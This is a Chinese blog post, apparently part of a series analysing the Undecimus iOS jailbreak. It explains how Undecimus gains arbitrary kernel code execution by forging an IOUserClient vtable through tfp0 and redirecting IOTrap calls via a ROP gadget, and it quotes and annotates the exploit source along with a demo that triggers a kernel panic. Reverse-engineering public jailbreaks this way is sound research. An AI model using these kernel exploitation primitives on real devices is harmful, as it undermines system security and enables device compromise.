---
title: Undecimus 分析（三）通过 IOTrap 实现内核任意代码执行
date: 2020-01-12 21:00:00
tags: ['JailBreak', 'Undecimus', 'KEXEC', 'JOP']
---

# 前言
在 [上一篇文章](https://juejin.im/post/5e087dbd51882549757e5be2) 中我们介绍了基于 String 的交叉引用定位内核数据的方法，基于此我们可以定位变量和函数地址。本文将介绍结合tfp0、String XREF 定位和 IOTrap 实现内核任意代码执行的过程。一旦达成这个 Primitive，我们就能以 root 权限执行内核函数，从而更好的控制内核。

# kexec 概述
在 Undecimus 中，内核任意代码执行是通过 ROP Gadget 实现的。具体方法是劫持一个系统的函数指针，将其指向想要调用的函数，再按照被劫持处的函数指针原型准备参数，最后设法触发系统对被劫持指针的调用。

## 找到可劫持的函数指针
要实现上述 ROP，一个关键是找到一个可在 Userland 触发、易劫持的函数指针调用，另一个关键是该函数指针的原型最好支持可变参数个数，否则会对参数准备带来麻烦。所幸在 IOKit 中系统提供了 IOTrap 机制正好满足上述所有条件。

IOKit 为 userland 提供了 IOConnectTrapX 函数来触发注册到 IOUserClient 的 IOTrap，其中 X 代表的是参数个数，最大支持 6 个入参：
```c
kern_return_t
IOConnectTrap6(io_connect_t	connect,
	       uint32_t		index,
	       uintptr_t	p1,
	       uintptr_t	p2,
	       uintptr_t	p3,
	       uintptr_t	p4,
	       uintptr_t	p5,
	       uintptr_t	p6 )
{
    return iokit_user_client_trap(connect, index, p1, p2, p3, p4, p5, p6);
}
```

userland 的调用在内核中对应 `iokit_user_client_trap` 函数，具体实现如下：
```c
kern_return_t iokit_user_client_trap(struct iokit_user_client_trap_args *args)
{
    kern_return_t result = kIOReturnBadArgument;
    IOUserClient *userClient;

    if ((userClient = OSDynamicCast(IOUserClient,
            iokit_lookup_connect_ref_current_task((mach_port_name_t)(uintptr_t)args->userClientRef)))) {
        IOExternalTrap *trap;
        IOService *target = NULL;

        // find a trap
        trap = userClient->getTargetAndTrapForIndex(&target, args->index);

        if (trap && target) {
            IOTrap func;

            func = trap->func;

            if (func) {
                result = (target->*func)(args->p1, args->p2, args->p3, args->p4, args->p5, args->p6);
            }
        }

	iokit_remove_connect_reference(userClient);
    }

    return result;
}
```

上述代码先将从 userland 传入的 IOUserClient 句柄转换为内核对象，随后从 userClient 上取出 IOTrap 执行对应的函数指针。因此只要劫持 `getTargetAndTrapForIndex` 并返回刻意构造的 IOTrap，即可篡改内核执行的 `target->*func`；更为完美的是，函数的入参恰好是 userland 调用 IOConnectTrapX 的入参。

下面我们看一下 `getTargetAndTrapForIndex` 的实现：
```c
IOExternalTrap * IOUserClient::
getTargetAndTrapForIndex(IOService ** targetP, UInt32 index)
{
    IOExternalTrap *trap = getExternalTrapForIndex(index);
    
    if (trap) {
        *targetP = trap->object;
    }
    
    return trap;
}
```

可见 IOTrap 是从 `getExternalTrapForIndex` 方法返回的，继续跟进发现这是一个默认实现为空的函数：
```c
IOExternalTrap * IOUserClient::
getExternalTrapForIndex(UInt32 index)
{
    return NULL;
}
```

可见此函数在父类上默认不实现，大概率是一个虚函数，下面看一下 IOUserClient 的 class 的声明来验证：
```c
class IOUserClient : public IOService {
    // ...
    // Methods for accessing trap vector - old and new style
    virtual IOExternalTrap * getExternalTrapForIndex( UInt32 index ) APPLE_KEXT_DEPRECATED;
    // ...
};
```

既然是虚函数，我们可以结合 tfp0 修改 userClient 对象的虚函数表，篡改 `getExternalTrapForIndex` 的虚函数指针指向我们的 ROP Gadget，并在这里构造好 IOTrap 返回。

## 实现函数劫持
在 Undecimus 的源码中，`getExternalTrapForIndex` 的虚函数指针被指向了一个内核中已存在的指令区域：
```arm
add x0, x0, #0x40
ret
```

这里没有手动构造指令，应该是考虑到构造一个可执行的页成本较高，而复用一个已有的指令区域则非常简单。下面我们分析一下这两条指令的作用。

因为 `getExternalTrapForIndex` 是一个实例方法，它的 x0 是隐含参数 this，所以被劫持 `getExternalTrapForIndex` 的返回值为 this + 0x40，即我们要在 userClient + 0x40 处存储一个刻意构造的 IOTrap 结构：
```c
struct IOExternalTrap {
    IOService *		object;
    IOTrap		func;
};
```

再回忆下 IOTrap 的执行过程：
```c
trap = userClient->getTargetAndTrapForIndex(&target, args->index);
if (trap && target) {
    IOTrap func;

    func = trap->func;

    if (func) {
        result = (target->*func)(args->p1, args->p2, args->p3, args->p4, args->p5, args->p6);
    }
}
```

这里的 target 即 IOTrap 的 object 对象，它作为函数调用的隐含入参 this；而 func 即为被调用的函数指针。到这里一切都明朗了起来：
1. 将要执行的符号地址写入 trap->func 即可执行任意函数；
2. 将函数的第 0 个参数放置到 trap->object，第 1 ~ 6 个参数在调用 IOConnectTrap6 时传入，即可实现可变入参传递。

# kexec 代码实现
上述讨论较为宏观，忽略了一些重要细节，下面将结合 Undecimus 源码进行详细分析。

## PAC 带来的挑战
自 iPhone XS 开始，苹果在 ARM 处理器中扩展了一项称之为 PAC(Pointer Authentication Code) 的技术，它将指针和返回地址使用特定的密钥寄存器签名，并在使用时验签。一旦验签失败，将会解出一个无效地址引发 Crash，它为各种常见的寻址指令增加了扩展指令[1]：
```
BLR -> BLRA*
LDRA -> LDRA*
RET -> RETA*
```
这项技术给我们的 ROP 带来了很大麻烦，在 Undecimus 中针对 PAC 做了一系列特殊处理，**整个过程十分复杂，本文不再展开，将在接下来的文章中详细介绍 PAC 缓解措施及其绕过方式**。有兴趣的读者可以阅读 [Examining Pointer Authentication on the iPhone XS](https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html#) 来详细了解。

## 虚函数劫持
我们知道 C++ 对象的虚函数表指针位于对象的起始地址，而虚函数表中按照偏移存放着实例方法的函数指针[2]，因此我们只要确定了 `getExternalTrapForIndex` 方法的偏移量，再利用 tfp0 篡改虚函数指向的地址即可实现 ROP。

Undecimus 的相关源码位于 init_kexec 中，我们先忽略 arm64e 对 PAC 的处理，了解它的 vtable patch 方法，下面的代码包含了 9 个关键步骤，已给出关键注释：
```c
bool init_kexec()
{
#if __arm64e__
    if (!parameters_init()) return false;
    kernel_task_port = tfp0;
    if (!MACH_PORT_VALID(kernel_task_port)) return false;
    current_task = ReadKernel64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    if (!KERN_POINTER_VALID(current_task)) return false;
    kernel_task = ReadKernel64(getoffset(kernel_task));
    if (!KERN_POINTER_VALID(kernel_task)) return false;
    if (!kernel_call_init()) return false;
#else

    // 1. 创建一个 IOUserClient
    user_client = prepare_user_client();
    if (!MACH_PORT_VALID(user_client)) return false;

    // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
    // 2. 获取 IOUserClient 的内核地址，它是一个 ipc_port
    IOSurfaceRootUserClient_port = get_address_of_port(proc_struct_addr(), user_client); // UserClients are just mach_ports, so we find its address
    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_port)) return false;

    // 3. 从 ipc_port->kobject 获取 IOUserClient 对象
    IOSurfaceRootUserClient_addr = ReadKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_addr)) return false;

    // 4. 虚函数指针位于 C++ 对象的起始地址
    kptr_t IOSurfaceRootUserClient_vtab = ReadKernel64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_vtab)) return false;

    // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
    // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel

    // Create the vtable in the kernel memory, then copy the existing vtable into there
    // 5. 构造和拷贝虚函数表
    fake_vtable = kmem_alloc(fake_kalloc_size);
    if (!KERN_POINTER_VALID(fake_vtable)) return false;

    for (int i = 0; i < 0x200; i++) {
        WriteKernel64(fake_vtable + i * 8, ReadKernel64(IOSurfaceRootUserClient_vtab + i * 8));
    }

    // Create the fake user client
    // 6. 构造一个 IOUserClient 对象，并拷贝内核中 IOUserClient 的内容到构造的对象
    fake_client = kmem_alloc(fake_kalloc_size);
    if (!KERN_POINTER_VALID(fake_client)) return false;

    for (int i = 0; i < 0x200; i++) {
        WriteKernel64(fake_client + i * 8, ReadKernel64(IOSurfaceRootUserClient_addr + i * 8));
    }

    // Write our fake vtable into the fake user client
    // 7. 将构造的虚函数表写入构造的 IOUserClient 对象
    WriteKernel64(fake_client, fake_vtable);

    // Replace the user client with ours
    // 8. 将构造的 IOUserClient 对象写回 IOUserClient 对应的 ipc_port
    WriteKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);

    // Now the userclient port we have will look into our fake user client rather than the old one

    // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
    // 9. 将特定指令区域的地址写入到虚函数表的第 183 个 Entity
    // 它对应的是 getExternalTrapForIndex 的地址
    WriteKernel64(fake_vtable + 8 * 0xB7, getoffset(add_x0_x0_0x40_ret));

#endif
    pthread_mutex_init(&kexec_lock, NULL);
    return true;
}
```

此时我们已经修改了构造的 userClient 的 `getExternalTrapForIndex` 逻辑，接下来只需要对 userClient 调用 IOConnectTrap6 即可实现 ROP 攻击，剩下的一个关键步骤是准备 IOTrap 作为 ROP Gadget 的返回值。

## 构造 IOTrap
由于 `getExternalTrapForIndex` 被指向了如下指令：
```arm
add x0, x0, #0x40
ret
```

我们需要在 userClient + 0x40 处构造一个 IOTrap：
```c
struct IOExternalTrap {
    IOService *		object;
    IOTrap		func;
};
```
根据前面的讨论，object 应当被赋予被调用函数的第 0 个参数地址，func 应当赋予被调用函数的地址，然后再将函数的第 1 ~ 6 个参数通过 IOConnectTrap 的 args 传入。下面我们来看 Undecimus 中 kexec 的具体实现，笔者在其中补充了一些注释：
```c
kptr_t kexec(kptr_t ptr, kptr_t x0, kptr_t x1, kptr_t x2, kptr_t x3, kptr_t x4, kptr_t x5, kptr_t x6)
{
    kptr_t returnval = 0;
    pthread_mutex_lock(&kexec_lock);
#if __arm64e__
    returnval = kernel_call_7(ptr, 7, x0, x1, x2, x3, x4, x5, x6);
#else
    // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
    // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
    // This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
    // function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
    // through like normal.

    // Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
    // We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
    // (i'm not actually sure if the switch back is necessary but meh)

    // IOTrap starts at +0x40
    // fake_client 即我们构造的 userClient
    // 0ffx20 为 IOTrap->object，offx28 为 IOTrap->func，这里是对原始值进行备份
    kptr_t offx20 = ReadKernel64(fake_client + 0x40);
    kptr_t offx28 = ReadKernel64(fake_client + 0x48);
    
    // IOTrap->object = arg0
    WriteKernel64(fake_client + 0x40, x0);
    // IOTrap->func = func_ptr
    WriteKernel64(fake_client + 0x48, ptr);
    
    // x1~x6 为函数的第 1 ~ 6 个参数，第 0 个参数通过 trap->object 传入
    returnval = IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, x6);
    
    // 这里对原始值进行恢复
    WriteKernel64(fake_client + 0x40, offx20);
    WriteKernel64(fake_client + 0x48, offx28);
#endif
    pthread_mutex_unlock(&kexec_lock);
    return returnval;
}
```
基于上述讨论这段代码还是很好理解的，到这里非 arm64e 架构下的内核任意代码执行原理就讲解完了，有关 arm64e 的讨论将在下一篇文章中继续，下面我们用 kexec 做一个实验来验证 Primitive 的达成。

# kexec 实验
## 环境准备
请读者打开 Undecimus 源码的 `jailbreak.m`，搜索 `_assert(init_kexec()` 定位到初始化 kexec 的代码，向上翻可以发现 kexec 的初始化被放到了 ShenanigansPatch 和 setuid(0) 之后。ShenanigansPatch 是用来解决内核对 sandbox 化进程的 ucred 检查而采取的绕过措施[3]，它是通过 String XREF 定位和修改内核全局变量实现的，有兴趣的读者可以自行阅读 [Shenanigans, Shenanigans!](https://stek29.rocks/2018/12/11/shenanigans.html) 来了解。

对于非 arm64e 设备，似乎仅通过 tfp0 即可实现 kexec，这段处理应该是针对 arm64e 设备绕过 PAC 所做的必要提权处理。

**我们的实验代码一定要放到 `init_kexec` 执行成功之后才行**。

## 获取一个内核函数的地址
在 Undecimus 中获得了许多关键函数的地址，它们通过声明一个名为 find_xxx 的导出符号实现动态查找和缓存，需要注意的是，在 kexec 初始化后 kerneldump 已经被释放，因此必须在初始化 kerneldump 时就计算好函数的地址。

我们先参考 Undecimus 是如何查找和缓存一个内核数据的，以 vnode_lookup 函数为例：
首先我们需要在 `patchfinder64.h` 中声明一个名为 `find_<symbol_name>` 的函数，它返回被查找符号的地址：
```c
uint64_t find_vnode_lookup(void);
```

随后基于 String XREF 完成查找的实现：
```c
addr_t find_vnode_lookup(void) {
    addr_t hfs_str = find_strref("hfs: journal open cb: error %d looking up device %s (dev uuid %s)\n", 1, string_base_pstring, false, false);
    if (!hfs_str) return 0;
    
    hfs_str -= kerndumpbase;

    addr_t call_to_stub = step64_back(kernel, hfs_str, 10*4, INSN_CALL);
    if (!call_to_stub) return 0;
    
    return follow_stub(kernel, call_to_stub);
}
```

随后在 kerneldump 阶段通过宏函数 find_offset 完成查找：
```c
find_offset(vnode_lookup, NULL, true);
```

上述宏函数会动态调用 `find_<symbol_name>` 函数并将结果缓存起来，随后可通过 `getoffset` 宏函数来获取相应的偏移：
```c
kptr_t const function = getoffset(vnode_lookup);
```

这里我们照猫画虎的创建一个 panic 函数偏移：
```c
uint64_t find_panic(void)
{
    addr_t ref = find_strref("\"shenanigans!", 1, string_base_pstring, false, false);
    
    if (!ref) {
        return 0;
    }
    
    return ref + 0x4;
}
```

这里查找的代码是位于 sandbox.kext 中的 panic 语句：
```c
panic("\"shenanigans!\"");
```

通过 String XREF 我们能定位到 panic 调用前的 add 指令，下一条指令一定是 `bl _panic`，因此将查找结果 + 4 即可得到内核中 panic 函数的地址。

## 调用内核函数
在上文中我们找到了 panic 函数的地址，这里尝试用一个自定义字符串触发一个 kernel panic，注意由于 SMAP 的存在，panic string 要从 userland 拷贝到 kernel：
```c
// play with kexec
uint64_t function = getoffset(panic);
const char *testStr = "this panic is caused by userland!!!!!!!!!!!!!!!";
kptr_t kstr = kmem_alloc(strlen(testStr));
kwrite(kstr, testStr, strlen(testStr));
kptr_t ret = kexec(function, (kptr_t)kstr, KPTR_NULL, KPTR_NULL, KPTR_NULL, KPTR_NULL, KPTR_NULL, KPTR_NULL);
NSLog(@"result is %@", @(ret));
kmem_free(kstr, sizeof(testStr));
```

随后运行 Undecimus，会发生 kernel panic，为了验证我们成功调用了内核的 panic 函数，在 iPhone 上打开设置页，打开 `Privacy->Analytics->Analytics Data`，找到其中以 `panic-full` 开头的最新日志，如果试验成功可以看到如下内容：
![](https://user-gold-cdn.xitu.io/2020/1/12/16f991d81a07fa8b?w=592&h=1280&f=png&s=673260)

# 总结
本文详细介绍了非 arm64e 架构下通过 tfp0 实现 kexec 的过程和原理，由此可以给读者构造 ROP Gadget 带来启发。从下一篇文章开始，我们将分析 PAC 缓解措施及其绕过技巧。

<img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img>


# 参考资料
1. [Brandon Azad, Project Zero. Examining Pointer Authentication on the iPhone XS](https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html#)
2. [Malecrab. C/C++杂记：虚函数的实现的基本原理](https://www.cnblogs.com/malecrab/p/5572730.html)
3. [stek29.rocks. Shenanigans, Shenanigans!](https://stek29.rocks/2018/12/11/shenanigans.html)
4. [pwn20wndstuff. Undecimus](https://github.com/pwn20wndstuff/Undecimus/blob/9d7a1076a2b088b25677f4a53822a3c396b1b837/Undecimus/source/jailbreak.m)